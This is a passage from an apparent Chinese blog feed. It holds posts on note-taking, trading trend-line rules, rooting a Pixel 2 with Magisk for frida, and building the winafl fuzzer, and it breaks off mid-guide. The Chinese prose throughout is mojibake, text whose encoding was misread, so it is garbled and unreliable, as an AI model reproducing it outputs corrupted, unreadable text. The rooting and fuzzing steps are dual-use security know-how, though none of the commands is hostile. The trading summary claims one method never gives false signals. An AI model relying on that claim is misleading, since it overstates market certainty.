‡è®¾ç½®ä¸ºæ¯å¤©å†™3æ¡ç¬”è®°ï¼Œæˆ–è€…æ¯å¹´å‡ºä¸€æœ¬ä¹¦ï¼Œä»ç„¶å¯ä»¥åœ¨åˆç†çš„æ—¶é—´å†…ç§¯ç´¯å¤§é‡çš„æƒ³æ³•ã€‚</p></li><li><p>å¡ç‰‡ç¬”è®°æ³•å±äºè‡ªä¸‹è€Œä¸Šçš„å‘æ•£æ€ç»´ï¼Œå‘æ•£æ€ç»´æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ— æ³•æŠŠæ¡å‘æ•£çš„åº¦ã€‚ä¸ºäº†åº”å¯¹è¿™ä¸ªé—®é¢˜ï¼Œå¢æ›¼æå‡ºçš„åŠæ³•æ˜¯ä»”ç»†æ€è€ƒç¬”è®°ä¹‹é—´çš„è”ç³»ï¼Œå†™ç¬”è®°æ—¶å‚è€ƒæ–‡çŒ®ç¬”è®°å’Œè‡ªå·±ä»¥å‰å†™çš„ç¬”è®°ï¼Œå®šæœŸè‡ªä¸Šè€Œä¸‹åˆ¶ä½œç´¢å¼•å¡ç‰‡ï¼Œè¿™äº›åšæ³•çš„ç›®çš„æ˜¯é¿å…æƒ³æ³•è¿‡äºå¤ªå‘æ•£ã€‚</p></li><li><p>æ€ç»´éœ€è¦å‘æ•£ï¼Œä½†æ˜¯é¢†åŸŸéœ€è¦èšç„¦ï¼Œæˆ‘ä»¬åœ¨è‡ªå·±çš„ä¸“ä¸šï¼Œè´¢åŠ¡ç­‰é¢†åŸŸæ˜¯éœ€è¦ä¸æ–­ç²¾è¿›çš„ï¼Œè¿™ä¸¤ä¸ªæ–¹é¢ä¼¼ä¹æ˜¯çŸ›ç›¾çš„ã€‚</p></li><li><p>æœ€è¿‘çš„ç ”ç©¶å‘ç°å¯ä»¥ä½¿ç”¨ P.A.R.A. æ¥ç»„ç»‡é¡¶å±‚ç»“æ„ï¼Œç»Ÿé¢†éœ€è¦ç²¾è¿›çš„é¢†åŸŸï¼Œåœ¨å…·ä½“æƒ³æ³•çš„è®°å½•ä¸Šåˆ™ç»§ç»­ä½¿ç”¨å¡ç‰‡ç¬”è®°æ³•ã€‚è¿™ç§æ–¹æ³•ä½¿ç”¨ P.A.R.A. ä¸æ–­æ¨åŠ¨è‡ªå·±åœ¨å…³æ³¨é¢†åŸŸçš„å–å¾—è¿›å±•ï¼Œåˆèƒ½åœ¨å…³é”®çš„æ€è€ƒä¸Šä½¿ç”¨å¡ç‰‡ç¬”è®°æ³•ï¼Œè‡ªç”¨ä¸€æ®µæ—¶é—´æ„Ÿè§‰ä¸é”™ã€‚</p></li><li><p>æˆ‘ä»¥å‰è®¤ä¸ºç¬”è®°æ‚ä¹±çš„åŸå› æ˜¯æ˜¯ç¬”è®°ç¼ºä¹ç»„ç»‡ç»“æ„ï¼Œå®è·µç»“æœè¡¨æ˜è‰¯å¥½çš„åˆ†ç±»ç¡®å®æœ‰ä¸€å®šå¸®åŠ©ï¼Œä½†æ˜¯ä¸æ˜¯æœ€é‡è¦çš„ã€‚æœ€é‡è¦çš„æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œç”¨åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†è®°å½•ä½ çš„æ´è§ã€‚</p></li><li><p>æŠŠç¬”è®°ä¿å­˜åœ¨åŒä¸€ä¸ªåœ°æ–¹é¿å…äº†ç¬”è®°åˆ†æ•£ï¼Œè¿ç§»ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†åˆ™ä¸ºç¬”è®°ä¹‹é—´çš„è”ç³»ä¸èšåˆåˆ›é€ äº†æœ‰åˆ©æ¡ä»¶ã€‚å¦å¤–ï¼Œå½“æˆ‘ä»¬ä»¥ä¸€è‡´çš„æ ‡å‡†å†™ç¬”è®°æ—¶é˜»åŠ›æ˜¯æœ€å°çš„ï¼Œå…³æ³¨çš„æ˜¯ç¬”è®°çš„å†…å®¹ï¼Œå½¢å¼ç­‰å¤–åœ¨çš„ä¸œè¥¿åˆ™å˜å¾—ä¸å†é‡è¦ã€‚</p></li><li><p>æ–°çš„è§‚ç‚¹ã€æ–°çš„æ´è§ã€æ–°çš„æƒ³æ³•ï¼Œæ˜¯ç¬”è®°ç³»ç»Ÿä¸­æœ€æœ‰ä»·å€¼çš„ä¸œè¥¿ã€‚ç¬”è®°ç³»ç»Ÿåº”è¯¥ä¾§é‡äºçŸ¥è¯†çš„ç§¯ç´¯è€Œä¸æ˜¯ä¿¡æ¯çš„ç§¯ç´¯ã€‚</p></li><li><p>æ²¡æœ‰è®°å½•åŸºæœ¬å°±ç­‰äºæ²¡æœ‰å­¦ä¹ ï¼Œä¸è®ºè®°æ€§å¤šå¥½éƒ½ä¼šéšç€å¹´é¾„çš„å¢å¤§è€Œé€æ¸å¿˜è®°ï¼Œæ‰€ä»¥ä¸æ–­è®°å½•ï¼Œä¸æ–­æ€»ç»“ï¼Œä¸æ–­åˆ†æï¼Œæ‰èƒ½èºæ—‹å‰è¿›ã€‚</p></li></ul><p>æœªå®Œï¼Œå¾…ç»­ â€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸“ä¸šæŠ•æœºåŸç†ä¸­çš„æŠ€æœ¯åˆ†ææ³•åˆ™æ‘˜è¦</title>
    <link href="/cn/trader_vic/"/>
    <url>/cn/trader_vic/</url>
    
    <content type="html"><![CDATA[<p>æœ‰å…³é‡‘èå¸‚åœºæ–¹é¢çš„ä¹¦æˆ‘ä¸ªäººçš„å›¾ä¹¦é¦†é‡Œè‡³å°‘æœ‰1200æœ¬ã€‚å®ƒä»¬ä¸»è¦æ˜¯è®¨è®ºè¯åˆ¸åˆ†æã€æœŸæƒç­–ç•¥ã€æœŸè´§ç­–ç•¥ã€æŠ€æœ¯åˆ†æä»¥åŠå…¶ä»–ç›¸å…³æ–¹é¢çš„ä¹¦ã€‚è¿™äº›ä¹¦å¤§å¤šéƒ½åŒ…å«ç›¸å½“ä¸é”™çš„æ„æƒ³ï¼Œå…¶ä¸­çº¦2%æ˜¯çœŸæ­£ä¼˜ç§€çš„ä½œå“ã€‚ç„¶è€Œï¼Œå®ƒä»¬å¤§å¤šå­˜åœ¨ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼šè¯•å›¾æ¨é”€ä¸€ç§â€œæˆ˜èƒœå¸‚åœºâ€çš„æ–¹æ³•ï¼Œå¾ˆå¤šæ–¹æ³•ç”šè‡³æ²¡æœ‰ç»è¿‡å®é™…å¸‚åœºçš„å®Œæ•´æµ‹è¯•ã€‚</p><h2 id="å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿"><a href="#å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿" class="headerlink" title="å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿"></a>å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿</h2><p>ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ç»˜åˆ¶è¶‹åŠ¿çº¿å¯ä»¥æä¾›ä¸€è‡´è€Œç²¾ç¡®çš„ç»“æœï¼Œè€Œä¸”ç»å¯¹ä¸ä¼šäº§ç”Ÿé”™è¯¯çš„ä¿¡å·ï¼š</p><ol><li>é€‰æ‹©è€ƒè™‘çš„æ—¶é—´ï¼šé•¿æœŸï¼ˆæ•°æœˆè‡³æ•°å¹´ï¼‰ã€ä¸­æœŸï¼ˆæ•°ä¸ªæ˜ŸæœŸè‡³æ•°æœˆï¼‰æˆ–çŸ­æœŸï¼ˆæ•°å¤©è‡³æ•°ä¸ªæ˜ŸæœŸï¼‰ã€‚</li><li>ä¸Šå‡è¶‹åŠ¿çº¿ï¼šåœ¨è€ƒè™‘çš„æ—¶é—´å†…ï¼Œä»¥æœ€ä½çš„ä½ç‚¹ä¸ºèµ·ç‚¹ï¼Œå‘å³ä¸Šæ–¹ç»˜åˆ¶ä¸€æ¡ç›´çº¿ï¼Œè¿æ¥æœ€é«˜ç‚¹å‰çš„æŸä¸€ä¸ªä½ç‚¹ï¼Œä½¿è¿™æ¡ç›´çº¿åœ¨ä¸¤ä¸ªä½ç‚¹ä¹‹é—´æœªç©¿è¶Šä»»ä½•ä»·ä½ã€‚å»¶ä¼¸è¿™æ¡ç›´çº¿è€Œç»è¿‡æœ€é«˜ç‚¹ï¼ˆè¿™æ˜¯æŒ‡æ°´å¹³è½´ä¸Šçš„ä½ç½®è€Œè¨€ï¼‰ã€‚è¶‹åŠ¿çº¿ç»è¿‡æ‰€è€ƒè™‘çš„æœ€é«˜ç‚¹ä»¥åï¼Œå®ƒå¯èƒ½ç©¿è¶ŠæŸäº›ä»·ä½ã€‚äº‹å®ä¸Šï¼Œè¿™æ˜¯è¶‹åŠ¿å‘ç”Ÿå˜åŒ–çš„ä¸€ç§ç°è±¡ã€‚</li><li>ä¸‹é™è¶‹åŠ¿çº¿ï¼šåœ¨è€ƒè™‘çš„æ—¶é—´å†…ï¼Œä»¥æœ€é«˜çš„é«˜ç‚¹ä¸ºèµ·ç‚¹ï¼Œå‘å³ä¸‹æ–¹ç»˜åˆ¶ä¸€æ¡ç›´çº¿ï¼Œè¿æ¥æœ€ä½ç‚¹å‰çš„æŸä¸€ä¸ªé«˜ç‚¹ï¼Œè€Œä½¿è¿™æ¡ç›´çº¿åœ¨ä¸¤ä¸ªé«˜ç‚¹ä¹‹é—´æœªç©¿è¶Šä»»ä½•ä»·ä½ã€‚å»¶ä¼¸è¿™æ¡ç›´çº¿è€Œç»è¿‡æœ€ä½ç‚¹ã€‚</li></ol><p>è¿™ä¸ªæ–¹æ³•çš„ä¼˜ç‚¹åœ¨äºå…¶æ˜ç¡®æ€§ï¼Œå¹¶å¯ä»¥ç”¨æ¥åˆ¤æ–­è¶‹åŠ¿æ˜¯å¦å¯èƒ½å˜åŠ¨æˆ–å·²ç»å˜åŠ¨ã€‚</p><h2 id="ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„-123-æ³•åˆ™"><a href="#ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„-123-æ³•åˆ™" class="headerlink" title="ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„ 123 æ³•åˆ™"></a>ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„ 123 æ³•åˆ™</h2><ul><li>è‚¡ä»·çªç ´è¶‹åŠ¿çº¿</li><li>ä¸Šå‡è¶‹åŠ¿å›æ¡£åï¼Œä¸åˆ›æ–°é«˜ï¼›ä¸‹é™è¶‹åŠ¿åå¼¹åï¼Œä¸åˆ›æ–°ä½</li><li>ä¸Šå‡è¶‹åŠ¿è·Œç ´ä¸Šä¸€ä¸ªå›æ¡£ä½ç‚¹ï¼Œä¸‹é™è¶‹åŠ¿çªç ´ä¸Šä¸€ä¸ªåå¼¹é«˜ç‚¹</li></ul><h2 id="é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„-2Bæ³•åˆ™"><a href="#é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„-2Bæ³•åˆ™" class="headerlink" title="é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„ 2Bæ³•åˆ™"></a>é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„ 2Bæ³•åˆ™</h2><p>ä¸Šå‡è¶‹åŠ¿ä¸­ä»·æ ¼åˆ›æ–°é«˜åï¼Œå¹¶æœªæŒç»­ä¸Šæ¶¨ï¼Œè€Œååˆè·Œç ´å…ˆå‰çš„é«˜ç‚¹ï¼Œåˆ™è¶‹åŠ¿å¾ˆå¯èƒ½åè½¬ã€‚</p><h2 id="å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™"><a href="#å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™" class="headerlink" title="å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™"></a>å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™</h2><p>åœ¨ä¸­æœŸèµ°åŠ¿ä¸­ï¼Œå½“å¸‚åœºåœ¨é«˜ç‚¹æˆ–è€…ä½ç‚¹ä»¥è¿ç»­å››å¤©ä¸‹è·Œæˆ–ä¸Šæ¶¨çš„èµ°åŠ¿è€Œå‘ˆ<strong>åè½¬</strong>æ—¶ï¼Œè¶‹åŠ¿å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ ï¼ˆå’Œè¶‹åŠ¿æ–¹å‘ç›¸åçš„è¿ç»­å››æ ¹Kçº¿ï¼‰</p><h2 id="å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™"><a href="#å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™" class="headerlink" title="å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™"></a>å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™</h2><p>å½“ä¸­æœŸèµ°åŠ¿å‘å±•åˆ°ç›¸å½“ç¨‹åº¦ä»¥åï¼Œå¦‚æœå‡ºç°é¡ºåŠ¿çš„å››å¤©ï¼ˆæˆ–è€…ä»¥ä¸Šï¼‰æ’åˆ—ï¼Œéšåå‡ºç°ç¬¬ä¸€å¤©çš„é€†è¶‹åŠ¿è¡Œæƒ…ï¼Œç»å¸¸ä»£è¡¨è¶‹åŠ¿å˜åŠ¨çš„é¡¶éƒ¨æˆ–è€…åº•éƒ¨ã€‚</p><h2 id="ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™"><a href="#ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™" class="headerlink" title="ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™"></a>ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™</h2><p>ä¸‰å¤©çš„é«˜ä½ä»·å‡†åˆ™ï¼Œæ˜¯è¿ç”¨æœ€è¿‘ä¸‰å¤©çš„ç›˜ä¸­é«˜ä»·ä¸ä½ä»·ã€‚å½“ä»·æ ¼å‘ç”Ÿåè½¬è€Œç©¿è¶Šä¸‰å¤©çš„é«˜ä»·æˆ–ä½ä»·æ—¶ï¼Œåˆ™åšå¤šæˆ–å–ç©ºï¼Œå¹¶ä»¥ç¬¬ä¸‰å¤©çš„ä½ä»·æˆ–é«˜ä»·ä½œä¸ºæ­¢æŸç‚¹ã€‚ <strong>è¿™ä¸ªå‡†åˆ™å¿…é¡»é…åˆå¦ä¸€ä¸ªç¡®è®¤åŸåˆ™ã€‚</strong></p><h2 id="ç¼ºå£å‡†åˆ™"><a href="#ç¼ºå£å‡†åˆ™" class="headerlink" title="ç¼ºå£å‡†åˆ™"></a>ç¼ºå£å‡†åˆ™</h2><p>ç¼ºå£å‡†åˆ™å¾ˆç®€å•ï¼Œå½“è¶‹åŠ¿çº¿ä¸Šæ–¹æˆ–è€…ä¸‹æ–¹å‡ºç°ç¼ºå£æ—¶ï¼Œå®ƒåæ˜ é‡å¤§å˜åŒ–ï¼ˆæ¶ˆæ¯é¢æˆ–åŸºæœ¬é¢ï¼‰ï¼Œå¹¶æ˜¾ç¤ºè¶‹åŠ¿å¯èƒ½å‘ç”Ÿå˜åŠ¨ã€‚è¯¥å‡†åˆ™å¹¶ä¸éœ€è¦2Bï¼Œä¹Ÿä¸éœ€è¦ç»è¿‡è¯•æ¢ï¼ˆè¶‹åŠ¿çº¿ï¼‰ã€‚<br>ç„¶è€Œï¼Œç¼ºå£å¿…é¡»ç©¿è¶Šè¶‹åŠ¿çº¿ï¼Œè¯¥å‡†åˆ™æ‰æœ‰æ•ˆã€‚ <strong>è¿™ä¸ªå‡†åˆ™å¿…é¡»é…åˆå¦ä¸€ä¸ªç¡®è®¤åŸåˆ™ã€‚</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>root Pixel2 Android 11 çš„æ–¹æ³•</title>
    <link href="/cn/root_android11_pixel2/"/>
    <url>/cn/root_android11_pixel2/</url>
    
    <content type="html"><![CDATA[<p>è¦æ­£å¸¸ä½¿ç”¨ frida é¦–å…ˆéœ€è¦æŠŠæ‰‹æœºç»™ root äº†ï¼Œ åœ¨æœ€è¿‘æµ‹è¯•çš„æƒ…å†µå‘ç° Android 10 å’Œ Android 11 ç³»ç»Ÿå·¥ä½œæ¯”è¾ƒæ­£å¸¸ï¼Œ Android 6 å’Œå…¶ä»–ç³»ç»Ÿä¼¼ä¹å·®ä¸€äº›ï¼Ÿ</p><p>è¦åˆ·æœºé¦–å…ˆéœ€è¦ä¸‹è½½ <code>adb</code> ç­‰å·¥å…·ï¼Œè¿™äº›å·¥å…·ç”± Android çš„ SDK platform tools æä¾›ï¼Œä¸‹è½½åœ°å€ä¸ºï¼š<a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a><br>é€‰æ‹©ç›¸åº”çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸‹è½½å³å¯ï¼Œ Google æä¾›äº† Windowsã€Linuxã€Mac ç­‰ç³»ç»Ÿçš„æ”¯æŒã€‚</p><p>åŸºç¡€é•œåƒå¯ä»¥é€‰æ‹©çš„ Google çš„å®˜æ–¹é•œåƒ Factory Imageï¼Œå¦‚æœèƒ½è‡ªå·±ç¼–è¯‘ Android ç³»ç»Ÿåˆ™æ›´å¥½ï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç³»ç»Ÿåº“çš„ç¬¦å·ã€‚</p><p>æˆ‘çš„ Android æ‰‹æœºä¸º Pixel 2 åœ¨ <a href="https://developers.google.com/android/images#walleye">https://developers.google.com/android/images#walleye</a> ä¸Šå¯ä»¥æŸ¥æ‰¾ç›¸åº”çš„é•œåƒï¼Œ ä¸‹ä¸ªæœ€æ–°çš„ <a href="https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip">https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip</a></p><p>è¦æƒ³åˆ·é•œåƒå‰ææ¡ä»¶æ˜¯å…ˆè¦è§£é” bootloaderï¼Œ Pixel2 æ–°æ‰‹æœºè§£é”çš„å‘½ä»¤å’Œä»¥å‰æœ‰å˜åŒ–ï¼Œå¯ä»¥å‚è€ƒ <a href="https://source.android.com/devices/bootloader/locking_unlocking">https://source.android.com/devices/bootloader/locking_unlocking</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb reboot bootloader<br>fastboot flashing unlock_critical<br></code></pre></td></tr></table></figure><p>ä¸‹è½½è§£å‹åï¼Œé‡Œé¢æœ‰ä¸ª flash-all çš„è„šæœ¬ï¼Œå°†æ‰‹æœºé‡å¯åˆ° fastboot æ¨¡å¼åå¯ä»¥ç›´æ¥è¿è¡Œï¼Œ <code>adb reboot bootloader</code>ï¼Œ é‡å¯åˆ° fastboot æ¨¡å¼åï¼Œæ‰§è¡Œ flash-all è„šæœ¬ï¼Œåˆ·æœºç³»ç»Ÿé•œåƒå°±å®Œæˆäº†ã€‚</p><p>ä»¥å‰ root  Android ç”¨çš„éƒ½æ˜¯ SuperSU å’Œ TWRPï¼Œ è¿™æ¬¡ä½¿ç”¨äº†ä¸€ä¸ªä¸åŒçš„æ–¹æ³• <a href="https://github.com/topjohnwu/Magisk">Magisk</a> ï¼Œ å®‰è£…çš„æ–¹æ³•å‚è§ï¼š<br><a href="https://topjohnwu.github.io/Magisk/install.html">https://topjohnwu.github.io/Magisk/install.html</a></p><p>æœ‰ä¸¤ç§æ¨¡å¼ï¼Œ patch boot æˆ–è€… patch recoveryï¼Œ å®‰è£… Magisk app åå¦‚æœç•Œé¢æ˜¾ç¤º  <code>Ramdiskï¼šYes</code>ï¼Œåˆ™éœ€è¦ patch bootã€‚<br>Magisk app çš„ä¸‹è½½åœ°å€ <a href="https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk">https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk</a></p><p>å®‰è£… Magisk app åï¼Œ é€‰æ‹©éœ€è¦ patch çš„é•œåƒæ–‡ä»¶ï¼Œé€‰æ‹©åä¼šè‡ªåŠ¨ç”Ÿæˆæ–°çš„ä¿®æ”¹è¿‡åçš„é•œåƒæ–‡ä»¶ã€‚<br>è·å¾—ä¿®æ”¹åçš„é•œåƒæ–‡ä»¶åï¼Œéœ€è¦å°†ä¿®æ”¹åçš„é•œåƒæ–‡ä»¶é‡æ–°åˆ·ä¸€æ¬¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fastboot flash boot /path/to/magisk_patched.img <span class="hljs-comment">#or fastboot flash recovery /path/to/magisk_patched.img</span><br></code></pre></td></tr></table></figure><p>åˆ·å®Œæ–°çš„ä¿®æ”¹åçš„é•œåƒï¼Œé‡å¯ç³»ç»Ÿï¼ŒRoot å°±å®Œæˆäº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>winafl fuzz å·¥å…·çš„ä½¿ç”¨</title>
    <link href="/cn/winafl/"/>
    <url>/cn/winafl/</url>
    
    <content type="html"><![CDATA[<h2 id="0-ä¸‹è½½-Visual-Studio-Community-2022"><a href="#0-ä¸‹è½½-Visual-Studio-Community-2022" class="headerlink" title="0. ä¸‹è½½ Visual Studio Community 2022"></a>0. ä¸‹è½½ Visual Studio Community 2022</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://aka.ms/vs/17/release/vs_community.exe">https://aka.ms/vs/17/release/vs_community.exe</a></p><p>ä»å¾®è½¯ç½‘ç«™ä¸‹è½½å¹¶å®‰è£… Visual Studio Community çš„æ—¶å€™é€Ÿåº¦åªæœ‰2 Kï¼Œä¸€ä¸‹åˆæ²¡èƒ½ä¸‹è½½æˆåŠŸã€‚å’¨è¯¢åŒäº‹å°é’»é£ï¼ŒæŒ‡å‡ºå¯èƒ½æ˜¯ DNS é—®é¢˜ï¼Œå°† DNS åˆ‡æ¢æˆé˜¿é‡Œçš„ DNS 223.5.5.5 åä¸‹è½½é€Ÿåº¦è¾¾åˆ° 4 Mã€‚ä¸­å›½å¼€å‘è€…ç½‘ç»œæ€»æ˜¯ä¸ªé—®é¢˜ï¼Œå¤§å®¶éƒ½æŒºä¸å®¹æ˜“çš„ã€‚</p><h2 id="1-ç¼–è¯‘-winafl"><a href="#1-ç¼–è¯‘-winafl" class="headerlink" title="1. ç¼–è¯‘ winafl"></a>1. ç¼–è¯‘ winafl</h2><ol><li>ä¸‹è½½ <a href="https://github.com/DynamoRIO/dynamorio/releases/download/cronbuild-9.0.19209/DynamoRIO-Windows-9.0.19209.zip">DynamoRIO</a> è§£å‹åˆ° D:\DynamoRIO</li><li>ä¸‹è½½ <a href="https://github.com/Kitware/CMake/releases/download/v3.24.0/cmake-3.24.0-windows-x86_64.zip">cmake</a> è§£å‹åˆ° D:\cmake</li><li>ä» Github ä¸‹è½½ <a href="https://github.com/googleprojectzero/winafl.git">winafl</a> ç¼–è¯‘ intel PT éœ€è¦åŒæ­¥ third_party çš„æºç </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/googleprojectzero/winafl.git<br><span class="hljs-built_in">cd</span> winafl<br>git submodule update --init --recursive<br></code></pre></td></tr></table></figure><ol start="4"><li>ä»èœå•ä¸­é€‰æ‹©  <code>X64 native tool command prompt for VS 2022</code>ï¼Œæ‰§è¡Œç¼–è¯‘å‘½ä»¤</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build64<br>cd build64<br>D:\cmake\bin\cmake.exe -G&quot;Visual Studio 17 2022&quot; -A x64 .. -DDynamoRIO_DIR=D:\DynamoRIO\cmake -DINTELPT=1<br>D:\cmake\bin\cmake.exe --build . --config Release<br></code></pre></td></tr></table></figure><p><code>-DINTelPT=1</code>  å‚æ•°å°†ç¼–è¯‘ Intel PT æ¨¡å¼çš„æ”¯æŒï¼Œç¼–è¯‘å®Œæˆåï¼Œå¯ä»¥æ­£å¸¸è¿è¡Œ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs applescript">.\build64\bin\Release&gt;.\afl-fuzz.exe<br><br>WinAFL <span class="hljs-number">1.16</span>b <span class="hljs-keyword">by</span> &lt;ifratric@google.com&gt;<br>Based <span class="hljs-keyword">on</span> AFL <span class="hljs-number">2.43</span>b <span class="hljs-keyword">by</span> &lt;lcamtuf@google.com&gt;<br><br>.\afl-fuzz.exe [ afl options ] <span class="hljs-comment">-- [instrumentation options] -- \path\to\fuzzed_app [ ... ]</span><br><br>Required parameters:<br><br>  -i dir        - input directory <span class="hljs-keyword">with</span> test cases<br>  -o dir        - output directory <span class="hljs-keyword">for</span> fuzzer findings<br>  -t msec       - <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">for</span> each <span class="hljs-built_in">run</span><br><br>Instrumentation type:<br><br>  -D dir       - directory <span class="hljs-keyword">with</span> DynamoRIO binaries (drrun, drconfig)<br>  -w winafl    - Path <span class="hljs-keyword">to</span> winafl.dll<br>  -P           - use Intel PT tracing mode<br>  -Y           - enable <span class="hljs-keyword">the</span> static instrumentation mode<br><br>Execution control settings:<br><br>  -f <span class="hljs-built_in">file</span>       - location <span class="hljs-built_in">read</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> fuzzed program (stdin)<br>  -m limit      - memory limit <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> target process<br>  -p            - persist DynamoRIO cache across target process restarts<br>  -c cpu        - <span class="hljs-keyword">the</span> CPU <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> <span class="hljs-keyword">the</span> fuzzed program<br><br>Fuzzing behavior settings:<br><br>  -d            - quick &amp; dirty mode (skips deterministic steps)<br>  -n            - fuzz <span class="hljs-keyword">without</span> instrumentation (dumb mode)<br>  -x dir        - optional fuzzer dictionary (see README)<br><br>Other stuff:<br><br>  -I msec       - <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">for</span> process initialization <span class="hljs-keyword">and</span> <span class="hljs-keyword">first</span> <span class="hljs-built_in">run</span><br>  -T <span class="hljs-built_in">text</span>       - <span class="hljs-built_in">text</span> banner <span class="hljs-keyword">to</span> show <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> screen<br>  -M \ -S <span class="hljs-built_in">id</span>   - distributed mode (see parallel_fuzzing.txt)<br>  -C            - crash exploration mode (<span class="hljs-keyword">the</span> peruvian rabbit thing)<br>  -e            - expert mode <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> WinAFL <span class="hljs-keyword">as</span> a DynamoRIO tool<br>  -l path       - a <span class="hljs-built_in">path to</span> user-defined DLL <span class="hljs-keyword">for</span> custom test cases processing<br>  -V            - show <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exit</span><br><br>Attach:<br><br>  -A module     - attach <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> process <span class="hljs-keyword">that</span> loaded <span class="hljs-keyword">the</span> provided module<br><br>For additional tips, please consult afl_docs\README.<br><br><br>C:\Users\zhouzhen\Downloads\winafl\build64\bin\Release&gt;<br></code></pre></td></tr></table></figure><h2 id="2-æ£€æŸ¥-DynamoRIO-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"><a href="#2-æ£€æŸ¥-DynamoRIO-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ" class="headerlink" title="2. æ£€æŸ¥ DynamoRIO æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"></a>2. æ£€æŸ¥ DynamoRIO 